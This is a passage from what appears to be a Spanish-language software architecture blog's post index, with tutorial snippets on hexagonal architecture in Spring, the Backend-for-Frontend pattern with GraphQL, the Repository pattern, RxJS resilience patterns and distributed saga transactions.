debemos definir las implementaciones de los puertos, es decir, los adaptadores. En este caso, tenemos los siguientes puertos:public interface DomainEventBus { void publish(DomainEvent&lt;?&gt; event);}public interface ProfessionalRepository { void save(Professional p); void update(Professional p); Stream&lt;Professional&gt; findAll();}Crearemos las implementaciones:public class InMemoryDomainEventBus implements DomainEventBus { @Override public void publish(DomainEvent&lt;?&gt; event) { // ... send events code }}Crearemos un repository de Spring y su entidad correspondiente:@Entity@Table(name = \"professionals\")@Data@Builder@NoArgsConstructor@AllArgsConstructorpublic class ProfessionalEntity { @Id @GeneratedValue(generator = \"UUID\") private UUID id; @NotBlank @Column private String firstname; @Column @NotBlank private String lastname;}public interface JpaProfessionalRepository extends JpaRepository&lt;ProfessionalEntity, UUID&gt; {}Y ahora implementamos el puerto ProfessionalRepository:@Repository@AllArgsConstructorpublic class PostgresProfessionalRepository implements ProfessionalRepository { private final JpaProfessionalRepository repository; @Override public void save(Professional p) { var entity = ProfessionalEntity.builder() .id(UUID.fromString(p.getId())) .firstname(p.getFirstname()) .lastname(p.getLastname()) .build(); repository.save(entity); } @Override public void update(Professional p) { this.save(p); } @Override public Stream&lt;Professional&gt; findAll() { return repository.findAll() .stream() .map(e -&gt; Professional.builder() .id(e.getId().toString()) .firstname(e.getFirstname()) .lastname(e.getLastname()) .build()); }}Debemos hacer hincapié en que la entidad ORM es distinta a una entidad de dominio. Muchos confunden ambos conceptos y los tratan de igual manera, y lo único que logran es acoplar las lógicas de negocio con implementaciones tecnológicas de persistencia. Las entidades ORM representan un mapeo de base de datos y pueden tener comportamientos inesperados si se tratan como lógicas de negocio.Inyección de Servicios de AplicaciónEn la capa de aplicación nos encontramos con los casos de uso o, propiamente dicho, la entrada y control del programa. Ahora debemos inyectar de manera manual el servicio ProfessionalUseCases. Para lograrlo, haremos uso de un componente de tipo @Configuration de Spring.En esta clase inyectamos el puerto ProfessionalRepository, el cual es una interfaz. Spring, por debajo, encuentra el componente PostgresProfessionalRepository y lo inyectará, ya que esta es la implementación de ProfessionalRepository. Ahora solo debemos definir a ProfessionalUseCases mediante la anotación @Bean, la cual le indica a Spring que el componente puede ser llamado desde otros puntos de la aplicación. También creamos el bean DomainEventBus.@Configuration@AllArgsConstructorpublic class CoreConfig { ProfessionalRepository professionalRepository; @Bean public ProfessionalUseCases getProfessionalUseCase() { return new ProfessionalUseCases(professionalRepository, getDomainEventBus()); } @Bean public DomainEventBus getDomainEventBus() { return new InMemoryDomainEventBus(); }}Ahora, para hacer uso de los casos de uso de la aplicación, lo hacemos de manera tradicional con Spring:@Autowiredprivate ProfessionalUseCases useCases;Esta es la manera básica de implementar la inyección de dependencias en una arquitectura hexagonal. Puede que nos dé un poco de código extra comparado con la manera tradicional de hacer aplicaciones en Spring, pero obtendrás las siguientes ventajas: Código portable: La lógica y las reglas de negocio serán portables entre frameworks, librerías e integraciones tecnológicas como bases de datos, integraciones con eventos, etc. Test unitario más simple: El testing unitario es el más simple de realizar; sin embargo, si tu código no sigue buenas prácticas, será complejo de igual manera. Enfoques de clean architecture te permitirán realizar testing de forma sencilla. Código de dominio se autoexplica: Si implementas hexagonal o cualquier arquitectura limpia, tenderás a crear código con mejores prácticas. Estas incluirán una definición de nombres y acciones más orientadas a comportamiento que a tecnologías. Mantenibilidad: Un código que separa el dominio de implementaciones tecnológicas podrá llevar a cabo cambios menos drásticos a los que pueden realizarse cuando ambos conceptos están acoplados.ConclusiónLa integración de la arquitectura hexagonal en aplicaciones Spring ofrece una sólida separación entre el dominio y las implementaciones tecnológicas, permitiendo un diseño modular y flexible. Aunque requiere un esfuerzo adicional en la configuración inicial, los beneficios a largo plazo en términos de mantenibilidad, portabilidad, y simplicidad en las pruebas unitarias son significativos. Al adoptar esta arquitectura, se fomenta un enfoque más limpio y organizado en el desarrollo de software, facilitando la evolución y escalabilidad de las aplicaciones con un menor costo técnico.Github repositoryMeme de despedida" }, { "title": "Backend for Frontend pattern", "url": "/posts/backend-for-frontend-pattern/", "categories": "Backend,Frontend,GraphQL,Software, Engineer", "tags": "backend,frontend,graphql,software, engineer", "date": "2024-06-24 01:00:00 -0400", "snippet": "Cuando optamos por una arquitectura basada en microservicios, hemos dividido un sistema complejo en pequeñas partes independientes y con responsabilidades definidas. A su vez, surge la necesidad de gestionar el acceso y consumo de los microservicios que hemos desarrollado. Para lograrlo, podemos hacer uso del patrón BFF (Backend for Frontend). La idea es similar a la de un api gateway, un componente central encargado de gestionar las peticiones de los clientes y redireccionar la petición al servicio adecuado. La gran diferencia es que BFF es una aplicación específica para una aplicación cliente, como puede ser un frontend, aplicación móvil u otro tipo de cliente.Tipos de BFFExisten 2 tipos principales de BFF: BFF específico por dispositivo: se construye una aplicación BFF por tipo de dispositivo, generalmente uno para una versión web y otro para una versión móvil. BFF por dominio: se centra en construir un BFF por funcionalidad. Por ejemplo, un BFF para ventas, otro para usuarios, otro para clientes, etc.Ejemplo e implementación tecnológica de BFF por dispositivoTomaremos un ejemplo de implementación de BFF basado en nuestra querida arquitectura de clone spotify.En contextoNuestro spotify-clone tiene 2 clientes disponibles: web y mobile. Ambas aplicaciones están definidas para un cliente específico, ya que cada tipo de cliente tiene diferentes requerimientos. Por ejemplo, una aplicación móvil tendrá que lidiar con problemas de latencia y también tendrá muchas más funcionalidades que una aplicación versión web. Por lo tanto, el diseño de la API del BFF mobile debería poder ofrecer un alto nivel de flexibilidad. Por otro lado, nuestra BFF versión web no tendrá que lidiar con problemas de latencia tan frecuentemente como la versión móvil, y la cantidad de funcionalidades puede diferir en comparación con la versión mobile. Para construir nuestros BFFs, optaremos por 2 tecnologías distintas: web-bff: Aplicación backend basada en RESTful. mobile-bff: Aplicación backend basada en GraphQL.GraphQL vs RESTfulGraphQL es una tecnología que permite a los clientes especificar exactamente qué datos necesitan en una única solicitud y devuelve respuestas estructuradas según lo solicitado, utilizando normalmente un único endpoint. Por otro lado, una API RESTful utiliza múltiples endpoints con estructuras de datos fijas y a menudo requiere múltiples solicitudes para obtener toda la información necesaria, lo que puede ser menos eficiente en la red.GraphQL es ideal para las necesidades de la aplicación BFF-mobile, mientras que una API RESTful es suficiente para bff-web dentro del contexto de spotify-clone.Construyendo un BFFAl construir un BFF, definiremos la estructura de las peticiones y respuestas. A menudo, un BFF realiza múltiples peticiones a microservicios y agrupa las respuestas en una sola para devolverla al cliente. Un BFF no debería manejar ninguna lógica de negocio más que saber qué servicio llamar y cómo devolver las respuestas. A su vez, un BFF puede centralizar la autenticación, autorización y caché.Código de ejemploNestJs nos permite integrar GraphQL de forma sencilla, ya que podemos definir el modelo de las queries, mutaciones y suscripciones mediante anotaciones.Explicaré brevemente las partes de GraphQL para mostrar la idea. La aplicación de ejemplo la encuentras en el siguiente enlace bff-mobile appModeloDefinimos el modelo de la entidad que queremos exponer. A su vez, este modelo puede exponer otros modelos mediante propiedades. Hacemos uso de decoradores para poder definir el esquema de nuestra API GraphQL.import { Field, ObjectType } from '@nestjs/graphql';import { Album } from './album.model';@ObjectType()export class Artist { @Field({ nullable: true }) id: string; @Field() name: string; @Field({ nullable: true }) photo?: string; @Field({ nullable: true }) biography?: string; // eslint-disable-next-line @typescript-eslint/no-unused-vars @Field(type =&gt;[Album], { nullable: 'itemsAndList' }) albums?: Album[] }ResolversLos resolvers son un componente que le dice a GraphQL cómo debe obtener los datos que les son solicitados. NestJs nos provee más decoradores para poder definir el esquema de datos de nuestra API GraphQL.@Resolver(of =&gt; Artist)export class ArtistResolver { constructor(private grpc: MusicCatalogClient) {} @Span(\"ArtistResolver/query/artistById\") @Query(returns =&gt; Artist) artistById(@Args('id') id: string) { return this.grpc.findArtistById(id) } @Span(\"ArtistResolver/query/artists\") @Query(returns =&gt; [Artist]) artists() { return this.grpc.findAllArtists().pipe(toArray()) } @Span(\"ArtistResolver/field/album\") @ResolveField() async albums(@Parent() artist: Artist) { return this.grpc.findAlbumsByArtistId(artist.id).pipe(toArray()) } }API ClientEn este caso, hacemos uso de un servicio de gRPC para obtener los datos. También podemos hacer llamados a APIs REST dependiendo de la API que necesitemos consumir.@Injectable()export class MusicCatalogClient implements OnModuleInit { private artistService: ArtistService; private albumService: AlbumService; private songService: SongService; private genreService: GenreService; constructor(@Inject('MUSIC_CATALOG_PACKAGE') private client: ClientGrpc) { } onModuleInit() { this.artistService = this.client.getService&lt;ArtistService&gt;('ArtistService'); this.albumService = this.client.getService&lt;AlbumService&gt;('AlbumService'); this.songService = this.client.getService&lt;SongService&gt;('SongService'); this.genreService = this.client.getService&lt;GenreService&gt;('GenreService'); } findAllArtists() { return this.artistService.GetAllArtists({}); } findArtistById(id: string) { return this.artistService.GetArtistById({ id }) } findAllAlbums() { return this.albumService.GetAllAlbums({}); } findAlbumById(id: string) { return this.albumService.GetAlbumById({ id }); } findAlbumsByArtistId(id: string) { return this.albumService.GetAlbumsByArtistId({ id }); } findAllSongs() { return this.songService.GetAllSongs({}); } findSongById(id: string) { return this.songService.GetSongById({ id }); } findSongsByIds(ids: string[]) { return this.songService.GetSongsByIds(ids.map(id =&gt; ({ id }))); } findSongsByArtistId(id: string) { return this.songService.GetSongsByArtistId({ id }); } findSongsByAlbumId(id: string) { return this.songService.GetSongsByAlbumId({ id }); } findSongsByGenreId(id: string) { return this.songService.GetSongsByGenreId({ id }); } findAllGenres() { return this.genreService.GetAllGenres({}); } findGenreById(id: string) { return this.genreService.GetGenreById({ id }); }}Hacemos definición de los módulos para que NestJs pueda iniciar la aplicación.@Module({ imports: [ ConfigModule.forRoot(), GraphQLModule.forRoot&lt;ApolloDriverConfig&gt;({ driver: ApolloDriver, autoSchemaFile: join(process.cwd(), 'apps/mobile-bff/schema.gql'), }), MusicLibraryGrpcModule, MusicLibraryApiModule, MusicDiscoveryApiModule, MusciPlayerModule ], providers: [ ArtistResolver, AlbumResolver, GenreResolver, SongResolver, RadioResolver, ],})export class MobileBffModule { }Para probar la API, inicia los siguientes servicios.# you need docker for infranpm run start:infra# populate datanpm run job:create-music-librarynpm run start:music-librarynpm run start:discoverynpm run start:medianpm run start:mobile-bffPuedes dirigirte a http://localhost:3014/graphql y visualizar una Playground que nos provee GraphQL por defecto, donde podrás consultar el esquema de la API y realizar consultas.ConclusionesBFF nos permite centralizar el acceso a microservicios en un solo punto de entrada para las aplicaciones cliente. Dependiendo de las necesidades, tenemos disponibles distintas tecnologías para la comunicación, tanto para la comunicación de cliente a BFF como de BFF a microservicios. Como vimos en este ejemplo, GraphQL define una estructura de consulta eficiente para aplicaciones cliente móviles. La elección de la tecnología que expondremos al cliente dependerá del contexto. Lo importante es que mediante BFF podamos centralizar las peticiones a los microservicios en un único punto y podamos exponer de forma sencilla nuestro sistema.Github repositoryMeme de despedida" }, { "title": "Repository pattern simple escalable y para todo tipo de proyectos", "url": "/posts/repository-pattern-simple-escalable-y-para-todo-tipo-de-proyectos/", "categories": "Software,Arquitectura,Patrones,ORM", "tags": "software,arquitectura,patrones,orm", "date": "2024-05-29 01:00:00 -0400", "snippet": "El patrón de diseño Repository se utiliza para abstraer la lógica de acceso a datos de la lógica de negocio. Su objetivo es encapsular el acceso a los datos y ocultarlo a cualquier componente que utilice el repositorio. De esta manera, la capa de negocio no necesita preocuparse por cómo se accede a los datos, sino que simplemente interactúa con el repositorio para obtener la información que requiere.¿Por qué usar el Repository pattern?El Repository pattern es una buena opción cuando se quiere desacoplar la lógica de negocio de la lógica de acceso a datos. Esto permite que la lógica de negocio sea más fácil de entender y de mantener.Más que permitirnos tener un acceso a los datos desacoplados, la realidad es que el Repository pattern nos permite tener las siguientes ventajas: Lógica de negocio desacoplada de la lógica de acceso a datos nos permite crear un dominio más limpio y más relacionado al negocio que a implementaciones tecnológicas. Facilita la implementación de pruebas unitarias y de integración, ya que podemos simular el acceso a datos mediante mocks. Facilita la implementación de código limpio y patrones de diseño como el patrón de inyección de dependencias.Ejemplo sencillo y eleganteNos basaremos en el proyecto spotify-clone tomando la entidad Album, la cual representa un álbum de música.Componente EntidadUna entidad es un objeto del dominio que tiene una identidad única y distintiva, que persiste a lo largo del tiempo y puede cambiar su estado. Las entidades poseen atributos y métodos que permiten manipular su estado.export class Album { @IsUUID() @IsNotEmpty() @ApiProperty({ description: 'The ID of the album' }) id: string; @IsNotEmpty() @IsString() @ApiProperty({ description: 'The title of the album' }) title: string; @IsNotEmpty() @IsString() @ApiProperty({ description: 'The photo of the album' }) photo: string; @IsNumber() @ApiProperty({ description: 'The year the album was released' }) year: number;}En este caso, nuestra entidad Album no posee comportamiento, solo atributos y lógica de validaciones.Componente RepositorioEl repositorio es el encargado de acceder a los datos de la entidad Album. En este caso, el repositorio se encarga de acceder a los datos de los álbumes desde una base de datos. El repositorio es definido a través de una interfaz que define los métodos que se pueden utilizar para acceder a los datos de los álbumes. No nos preocuparemos de cómo se accede a los datos, simplemente el repositorio nos indica las operaciones que podemos realizar sobre nuestra entidad.export abstract class AlbumRepository { abstract findAll(): Promise&lt;Album[]&gt;; abstract findById(id: string): Promise&lt;Album&gt;; abstract findByArtistId(id: string): Promise&lt;Album[]&gt;;}Implementaciones del RepositorioComo hemos mencionado, el repositorio nos abstrae del acceso de datos, esto nos permitirá definir una implementación dependiendo del caso. También nos permitirá cambiar la fuente de datos sin tener que modificar la lógica de negocio en caso de que se requiera cambiar el tipo de almacenamiento por algún motivo.Implementación productiva con TypeORM y PostgresEn esta implementación utilizamos Postgres como base de datos y TypeORM como librería para acceder a los datos. Esta es nuestra implementación productiva:Definimos una Entidad de TypeORM que mapea la tabla albums en la base de datos. Entidad ORM (AlbumEntity) es distinta a la entidad del dominio Album, ya que la entidad de TypeORM es específica para el acceso a datos. Mientras que la entidad del dominio es específica para la lógica de negocio.@Entity({ name: \"albums\" })export class AlbumEntity { @PrimaryGeneratedColumn('uuid') id: string; @Column() title: string; @Column() photo: string; @Column() year: number; @ManyToOne(() =&gt; ArtistEntity, artist =&gt; artist.albums) artist: ArtistEntity;}Definimos un repositorio que implementa la interfaz AlbumRepository. En este caso, utilizamos NestJs para injectar el repositorio de TypeORM mediante el decorador @InjectRepository.@Injectable()export class PostgresAlbumRepository extends AlbumRepository { constructor(@InjectRepository(AlbumEntity) private repository: Repository&lt;AlbumEntity&gt;) { super() } findAll(): Promise&lt;Album[]&gt; { return this.repository.find(); } findById(id: string): Promise&lt;Album&gt; { return this.repository.findOneBy({ id }); } findByArtistId(id: string): Promise&lt;Album[]&gt; { return this.repository.findBy({ artist: { id } }); }}Implementación de pruebas con un mock en memoriaEn este caso, utilizamos un mock en memoria para simular el acceso a datos. Esta implementación es útil para pruebas unitarias y de integración.@Injectable()export class InMemoryAlbumRepository extends AlbumRepository { private albums: Album[] = [ { id: '1', title: 'Album 1', photo: 'photo1.jpg', year: 2021 }, { id: '2', title: 'Album 2', photo: 'photo2.jpg', year: 2021 }, { id: '3', title: 'Album 3', photo: 'photo3.jpg', year: 2021 }, ]; findAll(): Promise&lt;Album[]&gt; { return Promise.resolve(this.albums); } findById(id: string): Promise&lt;Album&gt; { return Promise.resolve(this.albums.find(album =&gt; album.id === id)); } findByArtistId(id: string): Promise&lt;Album[]&gt; { return Promise.resolve(this.albums.filter(album =&gt; album.artist.id === id)); }}Usando repository pattern en lógica de negocioEn este caso, AlbumService es el encargado de la lógica de negocio relacionada con los álbumes. Este se comunica con el repositorio para obtener los datos que necesita. AlbumService no tiene que preocuparse de cómo se accede a los datos, simplemente se comunica con el repositorio para obtener los datos que necesita.@Injectable()export class AlbumService { constructor(private repository: AlbumRepository) { } async getAlbums(): Promise&lt;Album[]&gt; { return this.repository.findAll(); } async getAlbum(id: string): Promise&lt;Album&gt; { const album = await this.repository.findById(id); if (!album) { throw new NotFoundException(`Album with id ${id} not found`); } return album; } async getAlbumsByArtist(id: string): Promise&lt;Album[]&gt; { return this.repository.findByArtistId(id); }}Inyectando dependenciasPara usar Repository Pattern generalmente se utiliza junto a la inyección de dependencias. En este caso, utilizamos NestJS como framework y el módulo TypeORM para la inyección de dependencias.@Module({ imports: [ TypeOrmModule.forFeature([AlbumEntity]) ], providers: [ AlbumService, { provide: AlbumRepository, useClass: PostgresAlbumRepository } ], exports: [AlbumService]})Y si queremos probar nuestro servicio sin framework o librería, por ejemplo en el contexto de pruebas unitarias, podemos crear nuestro servicio de la siguiente manera:// in memory repositoryconst repository: AlbumRepository = new InMemoryAlbumRepository();const service = new AlbumService(repository);// json repositoryconst repository: AlbumRepository = new JsonAlbumRepository();const service = new AlbumService(repository);ConclusiónEl verdadero poder del patrón Repository no es permitirnos cambiar la fuente de datos de manera sencilla. Este nos permite tener una lógica de negocio totalmente desacoplada de la implementación tecnológica del acceso de datos. Este sencillo enfoque, nos permite definir un dominio más limpio y testeable.Github repositoryMeme de despedida" }, { "title": "Patrones de resiliencia", "url": "/posts/patrones-de-resiliencia/", "categories": "Arquitectura, Software,, Microservicios,, Patrones,, Programacion,, Software", "tags": "arquitectura, software,, microservicios,, patrones,, programacion,, software", "date": "2024-05-09 01:00:00 -0400", "snippet": "¿Qué es la resiliencia?La resiliencia es la capacidad de un sistema de poder recuperarse de un escenario adverso. En el desarrollo de software, podemos aplicar este concepto para crear aplicaciones robustas, las cuales sean capaces de manejar errores sin comprometer el sistema entero.Los patrones de resiliencia son sencillos de entender e implementar con ayuda de la programación reactiva. A continuación, veremos los patrones más usados tanto en sistemas críticos como en procesos sencillos que, si bien pueden fallar y aislar el problema, un sistema resiliente hará todo lo posible para recuperarse antes de arrojar el error a una capa superior del sistema.TimeoutEste patrón define un tiempo límite de una petición. Esto nos ayuda a eliminar latencias grandes donde el sistema dará la impresión de estar pegado o cargando infinitamente. Generalmente, se usa en peticiones HTTP donde, cuando se cumpla un tiempo límite, nos indicará que este servicio está fallando.RetryRetry nos permite reintentar una petición cuando esta falla. Generalmente, un reintento viene con un tiempo de espera antes de volver a realizar la petición y generalmente se define un número finito de reintentos para no llegar a crear un loop infinito de peticiones fallidas.FallbackEste patrón nos permite definir una respuesta por defecto cuando el servicio o petición falla. Nos ayuda a no romper el sistema por arrojar alguna excepción o error. Se utiliza en peticiones que su respuesta no representa algo crítico en el proceso principal. Un ejemplo sería cuando nuestra aplicación de Spotify no encuentra las letras de alguna canción y este servicio responde simplemente con un texto de “letras no encontradas”.Las aplicaciones robustas utilizan una combinación de estos patronesEstos sencillos patrones son fáciles de implementar, pero la complejidad crece cuando queremos combinarlos entre sí, ya que este escenario planteado es más probable de encontrar en desarrollos serios.¿Cómo podemos implementar la resiliencia de forma elegante?Cuando hablamos de combinar o componer funcionalidades, podemos hacer uso de la programación funcional, donde cada patrón sería una función y, si queremos combinarlas, nos ayudamos de la composición de funciones o funciones de orden superior. En este caso, usaremos RxJS, una librería de JavaScript que nos permite trabajar con flujos de datos de manera reactiva e implementa en su corazon la programación funcional.Paradigma reactivoEl paradigma reactivo combina la programación funcional, la comunicación mediante eventos y el trato de los datos mediante un flujo. Una de las características de la programación reactiva que impulsa es la resiliencia, es por eso que aplicaremos los patrones antes vistos de manera sencilla con RxJS.Entendiendo los observablesUn observable es un componente que emite un valor y podemos suscribirnos para escuchar los cambios de este flujo. Bajo esta definición, podremos crear un observable que escuchara las peticiones y podremos aplicar resiliencia.Ejemplo de observable:import { Observable } from 'rxjs';// Creamos un observable que emite un array de números del 1 al 5const observable$ = of([1, 2, 3, 4, 5]);// Nos suscribimos al observable para escuchar los cambios en el flujo de datosobservable$.subscribe({ // La función next se ejecuta cuando se emite un nuevo valor en el observable next: (value) =&gt; console.log(value), // La función error se ejecuta cuando ocurre un error en el observable error: (error) =&gt; console.error(error), // La función complete se ejecuta cuando el observable ha completado su emisión de valores complete: () =&gt; console.log('complete')});Ya explicada la base de Rxjs, podemos implementar los patrones de resiliencia de manera sencilla.En el siguiente ejemplo, crearemos una función que agregará resiliencia a un Observable. La función tomará un Observable y devolverá una nueva función que tomará un objeto de opciones de resiliencia. Las opciones incluirán un tiempo de espera, un número de reintentos y un valor de respaldo opcional.import { Observable, catchError, iif, of, retry, throwError, timeout } from \"rxjs\";type ResilenceOptions&lt;T&gt; = { timeout: number, retry: { count: number, delay: number }, fallback?: T}export function addResilence&lt;T = any&gt;(source$: Observable&lt;T&gt;) { return function &lt;T = any&gt;(options: ResilenceOptions&lt;T&gt;) { const { timeout: timeoutMilliseconds, retry: retryOptions, fallback } = options; return source$.pipe( timeout({ each: timeoutMilliseconds, }), retry({ count: retryOptions.count, delay: retryOptions.delay }), catchError(err =&gt; iif(() =&gt; fallback !== undefined, of(fallback), throwError(() =&gt; err))) ) }}Este código define una función addResilence que agrega resiliencia a un Observable. La función addResilence toma un Observable source$ y devuelve una función que toma un objeto de opciones ResilenceOptions. Las opciones incluyen un tiempo de espera timeout, un objeto de reintento retry con un conteo y un retraso, y un valor de respaldo opcional fallback.La función devuelta configura el Observable para que se agote después de un cierto tiempo de espera timeout, que se reintente un número específico de veces con un cierto retraso retry, y que, en caso de error, devuelva el valor de respaldo si se proporciona uno fallback, o lance el error si no se proporciona un valor de respaldo.El operador catchError se utiliza para manejar los errores que pueden ocurrir durante la ejecución del Observable. Si se proporciona un valor de respaldo, se devuelve un Observable del valor de respaldo. Si no se proporciona un valor de respaldo, se lanza el error.Ejemplos concretosImplementaremos los siguientes ejemplos: Fallback sobre errores: Simularemos un error controlado y manejaremos el error con un valor de respaldo Timeout y reintentos: Simularemos una operación con un tiempo de espera y reintentosDefiniremos las opciones de resilencia para todos los ejemplos:const options: ResilenceOptions&lt;string&gt; = { timeout: 1000, retry: { count: 3, delay: 3000 }, fallback: \"Ops, something went wrong\"}Fallback para tratar erroresCrearemos la siguiente función que simula un errorconst failedRequest$ = throwError(() =&gt; { logger.error('throwing a controlled error 😨') return new Error('controlled error')})Ahora al agregar la resilencia al observable failedRequest$const fallbackRequest = addResilence(failedRequest$)const fallbackObservable$ = fallbackRequest(options)fallbackObservable$.subscribe({ next: (value) =&gt; logger.info(`fallback-response: ${JSON.stringify(value, null, 2)}`), error: (error) =&gt; logger.error(`resilence-error: ${error.message}`, error),})Recibiremos la siguiente salida:Timeout y reintentosPara simular una operación con timeot, creamos el siguiente observable:let intent = 0const calculateDelay = (intent: number) =&gt; intent === 3 ? 100 : 3000const retriedRequest$ = from(Promise.resolve()).pipe( tap(() =&gt; intent++), tap(() =&gt; { if (intent &gt; 0) logger.info(`executing retry number: ${intent}`) }), switchMap(() =&gt; of(\"Retry example 🧐\").pipe(delay(calculateDelay(intent)))));Y al observable retriedRequest$ le agregamos resilenciaconst retryRequest = addResilence(retriedRequest$)const retryObservable$ = retryRequest(options)retryObservable$.subscribe({ next: (value) =&gt; logger.info(`retry-response: ${JSON.stringify(value, null, 2)}`), error: (error) =&gt; logger.error(`resilence-error: ${error.message}`, error),})Obtendremos la siguiente salida:Y si queremos simular una operacion sin errores lo hacemos así:const successRequest$ = of('success request 😎')const successRequest = addResilence(successRequest$)const successObservable$ = successRequest(options)successObservable$.subscribe({ next: (value) =&gt; logger.info(`success-response: ${JSON.stringify(value, null, 2)}`), error: (error) =&gt; logger.error(`resilence-error: ${error.message}`, error),})ConclusionesLos patrones de resiliencia nos permiten crear aplicaciones robustas y preparadas para actuar ante cualquier error o intermitencia que algun servicio u operacion presente en el flujo de una aplicacion. RXjs nos provee una manera adecuada de tratar flujos complejos con la posibilidad de extender las capacidades actuales de un codigo basado en el paradigma reactivoGithub RepositoryMeme de regalo" }, { "title": "Sagas I - Transacciones Distribuidas Con Patrones Saga", "url": "/posts/sagas-i-transacciones-distribuidas-con-patrones-saga/", "categories": "Arquitectura, Software,, Microservicios,, Eventos, Architecture,, Patrones", "tags": "arquitectura, software,, microservicios,, eventos, architecture,, patrones", "date": "2024-03-11 02:00:00 -0300", "snippet": "Transacciones centralizadas vs distribuidasLas aplicaciones monolíticas tienen la ventaja de poder crear procesos transaccionales de forma sencilla. Las transacciones nos ayudan a mantener la consistencia de los datos en operaciones de escritura.Ya que podemos iniciar un conjunto de operaciones y, si son exitosas, persistir los cambios. Si algún error ocurre, realizaremos un rollback, el cual volverá a dejar en un estado consistente la base de datos antes de haber intentado una operación de escritura.Si bien las bases de datos relacionales nos permiten esto de forma sencilla, en las arquitecturas de microservicio los procesos transaccionales son complejos, ya que no existe manera de centralizar las operaciones de escritura.Para lograr transacciones en microservicios o sistemas distribuidos, podemos aprender de los patrones SAGA. Estos nos ayudarán a lidiar con sistemas distribuidos complejos donde involucran transacciones.Qué son las SAGASEl patrón SAGA (también conocido como patrón de transacción SAGA) es un patrón de diseño utilizado en arquitecturas de microservicios para manejar transacciones distribuidas. Su objetivo es mantener la consistencia de los datos en sistemas distribuidos donde múltiples servicios están involucrados en una transacción.En lugar de utilizar una transacción monolítica que involucre a todos los servicios y que pueda causar bloqueos y cuellos de botella, el patrón SAGA divide la transacción en pasos más pequeños o secuencias de acciones. Cada paso se ejecuta como una transacción independiente en el contexto de un servicio específico. Estos pasos se organizan en una secuencia lógica y se ejecutan de manera secuencial o en paralelo.El patrón SAGA utiliza dos estrategias principales para mantener la consistencia: SAGA Orquestada: Un componente central (orquestador) coordina y dirige la ejecución de los pasos de la transacción. Este orquestador envía comandos a los servicios involucrados para realizar las operaciones necesarias. Si un paso falla, el orquestador puede desencadenar acciones de compensación para revertir los cambios realizados en pasos anteriores. SAGA Coreografía: En este enfoque, no hay un orquestador central. En cambio, cada servicio conoce las acciones que debe realizar y cómo responder ante eventos. Cada servicio inicia sus propias transacciones y envía eventos para desencadenar las acciones en otros servicios. Este enfoque puede ser más complejo de diseñar y mantener, pero puede ser más escalable y distribuido. Diseñando una SagaOrquestado o coreográfico, independientemente de cuál sea, debemos definir lo siguiente: Transacciones o pasos Operaciones del servicio que realiza la transacción Comunicación entre serviciosCuando creamos un proceso basado en sagas, definiremos los pasos. Estos serán las invocaciones a las operaciones de las aplicaciones involucradas.Proceso de compra basado en sagasDiseñaremos un proceso de compra para un usuario basado en la adquisición de mercadería de las bandas de nuestro clon de Spotify. Entonces, estos son los pasos: create-order: encargado de crear una nueva orden en el sistema. create-payment: encargado de procesar un nuevo pago en el sistema. update-stock: encargado de actualizar el inventario de productos en el sistema. create-delivery: encargado de crear una nueva entrega en el sistema. notify-purchase: notificación al usuario de su compraCada paso definido se refiere a una operación en un microservicio. Cada operación puede ser síncrona o asíncrona, pero normalmente en una saga coreográfica debería ser asíncrona utilizando alguna estrategia de mensajería distribuida como RabbitMQ o Kafka.Operaciones de las sagasCada paso de nuestra saga debe definir los siguientes componentes: Transacción: la operación que realiza el microservicio. Esta debe devolver una respuesta exitosa o un error. Compensación: es la operación que actuará como un rollback, debe dejar el estado de los datos en la condición previa a la transacción realizada. Respuesta ok de transacción: indica que la transacción fue realizada exitosamente. Error en transacción: indica que la transacción falló, se deberá ver qué operaciones de compensación deben realizarse en este punto.Definiendo este contrato podremos coordinar nuestro proceso de manera uniforme a través de los servicios involucrados. Debemos tener en cuenta que las operaciones de inicio y término pueden diferir en la implementación de estos contratos, pero todos los procesos fuera de las operaciones de inicio y término deben cumplir este contrato.Para implementar de forma sencilla esto podemos hacer uso de un enum de typescript.// libs/distributed-transactions/src/user-purchases/orchestation-saga/sagas/CreateNotificationSaga.tsexport enum CreateNotificationSaga { TRANSACTION = 'send-notification-transaction', COMPENSATION = 'notification-compensation', OK = 'notification-sent-ok', ERROR = 'notification-error'}// libs/distributed-transactions/src/user-purchases/orchestation-saga/sagas/CreateOrderSaga.tsexport enum CreateOrderSaga { TRANSACTION = 'create-order-transaction', COMPENSATION = 'create-order-compensation', OK = 'create-order-ok', ERROR = 'create-order-error'}// libs/distributed-transactions/src/user-purchases/orchestation-saga/sagas/CreatePaymentSaga.tsexport enum CreatePaymentSaga { TRANSACTION = 'create-payment-transaction', COMPENSATION = 'create-payment-compensation', OK = 'create-payment-ok', ERROR = 'payment-error'}// libs/distributed-transactions/src/user-purchases/orchestation-saga/sagas/DeliverySaga.tsexport enum DeliverySaga { TRANSACTION = 'delivery-transaction', COMPENSATION = 'delivery-compensation', OK = 'delivery-ok', ERROR = 'delivery-error'}// libs/distributed-transactions/src/user-purchases/orchestation-saga/sagas/UpdateStockSaga.tsexport enum UpdateStockSaga { TRANSACTION = 'update-stock-transaction', COMPENSATION = 'update-stock-compensation', OK = 'update-stock-ok', ERROR = 'update-stock-error'}Donde cada valor corresponderá a un endpoint o el nombre de una cola o patrón de mensajería. De esta manera centralizamos nuestras constantes y nos ahorraremos problemas de typo. Al diseñar sistemas complejos, debemos considerar las buenas prácticas desde el comienzo para evitar errores triviales.Comunicación entre serviciosDebemos definir cómo comunicar los servicios. Dependiendo del enfoque, podremos hacer uso de comunicación síncrona (modelo request-response) o comunicación asíncrona (por eventos).En una comunicación por coreografía, la mejor opción es elegir la comunicación por mensajes o eventos. Mientras tanto, en la comunicación por orquestación, podemos hacer uso tanto de comunicación síncrona como asíncrona, es decir, podremos comunicarnos con los microservicios mediante una API REST para una manera síncrona, y por medio de una cola de mensajes para comunicación asíncrona.Diseñando la comunicación basada en eventosCada paso ya ha definido sus operaciones, es hora de diseñar la comunicación. Cada paso puede comunicarse con otros mediante mensajes, eventos o request-response. En esta saga de ejemplo diseñaremos una comunicación basada en eventos y nos ayudaremos de la siguiente clase abstracta que será la base.// libs/distributed-transactions/src/sagas/saga.event.tsimport { IsDate, IsNotEmpty, IsString, IsUUID, ValidateNested } from 'class-validator';type Props&lt;T&gt; = { transactionId: string; pattern: string; payload: T;}export abstract class SagaEvent&lt;T&gt; { @IsUUID() @IsNotEmpty() public readonly transactionId: string; @IsDate() @IsNotEmpty() public readonly timestamp: Date; @ValidateNested() public readonly payload: T; @IsString() @IsNotEmpty() public readonly pattern: string; constructor({ transactionId, pattern, payload }: Props&lt;T&gt;) { this.transactionId = transactionId; this.timestamp = new Date(); this.pattern = pattern; 